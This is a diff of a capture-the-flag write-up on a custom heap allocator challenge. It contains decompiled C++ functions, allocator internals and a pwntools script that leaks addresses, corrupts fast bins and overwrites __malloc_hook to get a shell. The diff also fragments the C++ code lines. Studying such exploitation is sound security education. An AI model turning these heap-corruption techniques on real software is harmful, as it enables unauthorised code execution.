@@ -11,24 +11,14 @@ libc.so.6 main
 $ file main
 main: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=2f8ac9c08eff09f2b0900cdb7e0aa18a3aeb6299, for GNU/Linux 3.2.0, stripped
 
-$ grep -a "GLIBC " libc.so.6 
+$ grep -a "GLIBC " libc.so.6
 DYNAMIC LINKER BUG!!!GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.9) stable release version 2.31.
-```
-
-
-
-```
 $ ./main
 1. Add item
 2. Delete item
 3. Edit item
 4. Read item
 5. Set Value
-```
-
-
-
-```
 struct chunk {
  long long prev_size;
  long long next_size;
@@ -38,26 +28,22 @@ struct chunk {
  long long next_ptr;
  char data[size - 0x30];
 }
-```
-
-
-
-```
 0x102e0: items_data_ptrs
 0x10380: items_count
 0x103e8: free_hook // I did not know this one while solving the challenge
 0x10400: fast_bins[30]
 0x104f0: unsorted_bin
 0x10500: heap_ptr
-```
-
-
-
-```
 unsigned __int64 edit_item() {
  ...
- std::operator<<<std::char_traits<char>>(&std::cout, "Enter index: ");
- std::istream::operator>>(&std::cin, &v2);
+ std::
+operator<<<std::
+char_traits<char>>(&std::
+cout, "Enter index: ");
+ std::
+istream::
+operator>>(&std::
+cin, &v2);
  if ( v2 >= items_count ) {
  ...
  }
@@ -69,15 +55,16 @@ unsigned __int64 edit_item() {
  read(0, items_data_ptrs[v2], v3->size - 0x30);
  ...
  }
-```
-
-
-
-```
 unsigned __int64 read_item() {
  ...
- std::operator<<<std::char_traits<char>>(&std::cout, "Enter index: ");
- std::istream::operator>>(&std::cin, &v2);
+ std::
+operator<<<std::
+char_traits<char>>(&std::
+cout, "Enter index: ");
+ std::
+istream::
+operator>>(&std::
+cin, &v2);
  if ( v2 >= items_count ) {
  ...
  }
@@ -88,15 +75,16 @@ unsigned __int64 read_item() {
  puts(items_data_ptrs[v2]);
  ...
 }
-```
-
-
-
-```
 unsigned __int64 set_value() {
  ...
- std::operator<<<std::char_traits<char>>(&std::cout, "Enter index: ");
- std::istream::operator>>(&std::cin, &v3);
+ std::
+operator<<<std::
+char_traits<char>>(&std::
+cout, "Enter index: ");
+ std::
+istream::
+operator>>(&std::
+cin, &v3);
  if ( v3 >= items_count ) {
  ...
  }
@@ -104,55 +92,71 @@ unsigned __int64 set_value() {
  if ( *sub_3130(&unk_103A0, &items_data_ptrs[v3]) == 1 ) {
  puts("Not allowed");
  } else {
- std::operator<<<std::char_traits<char>>(&std::cout, "Enter offset: ");
- std::istream::operator>>(&std::cin, &v2);
- std::operator<<<std::char_traits<char>>(&std::cout, "Enter value: ");
- std::operator>><char,std::char_traits<char>>(&std::cin, &v1);
+ std::
+operator<<<std::
+char_traits<char>>(&std::
+cout, "Enter offset: ");
+ std::
+istream::
+operator>>(&std::
+cin, &v2);
+ std::
+operator<<<std::
+char_traits<char>>(&std::
+cout, "Enter value: ");
+ std::
+operator>><char,std::
+char_traits<char>>(&std::
+cin, &v1);
  *(v2 + items_data_ptrs[v3]) = v1;
  *sub_3130(&unk_103A0, &items_data_ptrs[v3]) = 1; // set value called for chunk index
  }
  ...
 }
-```
-
-
-
-```
 unsigned __int64 add_item_wrapper() {
- std::operator<<<std::char_traits<char>>(&std::cout, "Enter size: ");
- std::istream::operator>>(&std::cin, &v5);
+ std::
+operator<<<std::
+char_traits<char>>(&std::
+cout, "Enter size: ");
+ std::
+istream::
+operator>>(&std::
+cin, &v5);
  v6 = add_item(v5);
  if ( v6 ) {
  if ( items_count > 19 ) {
  ...
  }
- v1 = std::operator<<<std::char_traits<char>>(&std::cout, "Created a new item");
- std::ostream::operator<<(v1, &std::endl<char,std::char_traits<char>>);
+ v1 = std::
+operator<<<std::
+char_traits<char>>(&std::
+cout, "Created a new item");
+ std::
+ostream::
+operator<<(v1, &std::
+endl<char,std::
+char_traits<char>>);
  v2 = items_count++;
  items_data_ptrs[v2] = v6;
  }
  ...
 }
-```
-
-
-
-```
 unsigned __int64 delete_item_wrapper() {
  ...
- std::operator<<<std::char_traits<char>>(&std::cout, "Enter index: ");
- std::istream::operator>>(&std::cin, &v2);
+ std::
+operator<<<std::
+char_traits<char>>(&std::
+cout, "Enter index: ");
+ std::
+istream::
+operator>>(&std::
+cin, &v2);
  if ( v2 >= items_count ) {
  ...
  }
  delete_item(items_data_ptrs[v2]);
  ...
 }
-```
-
-
-
-```
 char *__fastcall add_item(size_t a1) {
  ...
  // Set the appropriate size for chunk data and metadata in v8
@@ -161,12 +165,12 @@ char *__fastcall add_item(size_t a1) {
  else
  v8 = a1 + 0x30;
  ...
- /* 
+ /*
  Gets the fast_bin index for the calculated size
  If a fast_bin entry exist it will iterate through
  the linked list to get the last chunk.
  */
- v6 = (v8 - 0x40) >> 4; 
+ v6 = (v8 - 0x40) >> 4;
  if ( v6 <= 29 && fast_bins[v6] ) {
  v10 = fast_bins[v6];
  v11 = v10;
@@ -185,13 +189,13 @@ char *__fastcall add_item(size_t a1) {
  v9 = v12;
  } else {
  /*
- If an unsorted_bin entry exist it will iterate through 
+ If an unsorted_bin entry exist it will iterate through
  the linked list to find a chunk of the same size.
  */
  v14 = &unsorted_bin;
  v13 = 0LL;
  if ( unsorted_bin )
- v13 = sub_4DCC(v8, *v14); // 
+ v13 = sub_4DCC(v8, *v14); //
  if ( v13 ) {
  v15 = v13->next_ptr;
  v16 = v13->prev_ptr;
@@ -216,11 +220,6 @@ char *__fastcall add_item(size_t a1) {
  memset(&v9->data, 0, a1);
  return &v9->data;
 }
-```
-
-
-
-```
 unsigned __int64 __fastcall delete_item(__int64 a1) {
  ...
  /*
@@ -252,7 +251,7 @@ unsigned __int64 __fastcall delete_item(__int64 a1) {
  *v8 = v6;
  }
  } else {
- /* 
+ /*
  Otherwise it goes to the respective index in fast_bins
  also after checking for double free.
  */
@@ -271,11 +270,6 @@ unsigned __int64 __fastcall delete_item(__int64 a1) {
  }
  ...
 }
-```
-
-
-
-```
 def malloc(size):
  io.sendlineafter(b"Value\n", b"1")
  io.sendlineafter(b": ", str(size).encode())
@@ -303,11 +297,6 @@ def set_value(idx, off, val):
  io.sendlineafter(b": ", str(idx).encode())
  io.sendlineafter(b": ", str(off).encode())
  io.sendlineafter(b": ", p8(val))
-```
-
-
-
-```
 malloc(0x10) # 0
 malloc(0x200) # 1
 
@@ -320,11 +309,6 @@ update(0, padding)
 binary_leak = u64(read(0).split(b"|")[1].ljust(8, b"\0"))
 exe.address = binary_leak - 0x104f0
 log.info(f"binary @ {hex(exe.address)}")
-```
-
-
-
-```
 malloc(0x10) # 2
 malloc(0x10) # 3
 malloc(0x10) # 4
@@ -344,11 +328,6 @@ free(5)
 
 malloc(0x10) # items_data_ptrs[6] = fast_bins[2]
 set_value(6, -32, 0xf0)
-```
-
-
-
-```
 # Target address inside cout
 update(6, p64(exe.address + 0x100f0))
 malloc(0x30)
@@ -362,30 +341,15 @@ log.info(f"libc @ {hex(libc.address)}")
 
 # Fix cout
 update(7, b"\0" * (3*2*8) + p64(exe.address + 0x100c8))
-```
-
-
-
-```
 # Target address before the hook address to fit the constrains of the primitive
 update(6, p64(libc.sym["__malloc_hook"] - 0x30 - 0x20))
 malloc(0x30)
 
 set_value(8, -32, 0xf0)
 update(8, b"A" * 32 + p64(libc.address + 0xe3b01))
-```
-
-
-
-```
 io.sendlineafter(b"Value\n", b"1")
 io.sendlineafter(b": ", b"20")
 io.interactive()
-```
-
-
-
-```
 from pwn import *
 
 exe = context.binary = ELF('./main')
@@ -481,12 +445,7 @@ update(8, b"A" * 32 + p64(libc.address + 0xe3b01))
 io.sendlineafter(b"Value\n", b"1")
 io.sendlineafter(b": ", b"20")
 io.interactive()
-```
-
-
-
-```
-$ python3 exploit.py 
+$ python3 exploit.py
 [*] '/ctfs/backdoor/pwn/susalloc/main'
  Arch: amd64-64-little
  RELRO: Full RELRO
